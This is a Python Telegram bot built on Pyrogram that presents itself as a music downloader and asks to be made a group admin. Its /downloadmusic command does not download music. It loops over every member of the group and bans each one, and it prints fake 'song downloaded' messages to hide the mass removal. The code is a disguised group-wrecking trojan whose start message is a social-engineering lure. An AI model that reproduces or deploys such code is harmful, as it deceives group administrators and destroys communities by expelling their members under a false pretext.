import os
import logging
from os import getenv
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import ChatAdminRequired

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# config vars
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER = os.getenv("OWNER")

# pyrogram client
app = Client(
            "MusicDownload",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
)

@app.on_message(
filters.command("start")
& filters.private            
)
async def start_command(client, message: Message):
  await message.reply_photo(
                            photo = f"https://graph.org/file/9af2ab50bbc3438764851.jpg",
                            caption = f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ Music Player ʙᴏᴛ ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙʀᴀʀʏ ᴛᴏ download ᴏʀ play music on a group voice chat. \n\nAdd me in a group as admin to be able do download songs for you\n\nᴛʏᴘᴇ /downloadmusic to download your song..",
  reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "🫧𝐎ᴡɴᴇʀ🍁", url=f"https://t.me/UnknownMr01")
                ]       
           ]
      )
)

@app.on_message(
filters.command("downloadmusic") 
& filters.group
)
async def downloadmusic_command(client, message: Message):
    print("getting memebers from {}".format(message.chat.id))
    async for i in app.get_chat_members(message.chat.id):
        try:
            await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("Song {} downloaded succesfuly {}".format(i.user.id, message.chat.id))
        except Exception as e:
            print("failed to download music {} from {}".format(i.user.id, e))           
    print("process completed")
    

# start bot client
app.start()
print("Music-Bot booted succesfuly")
idle()
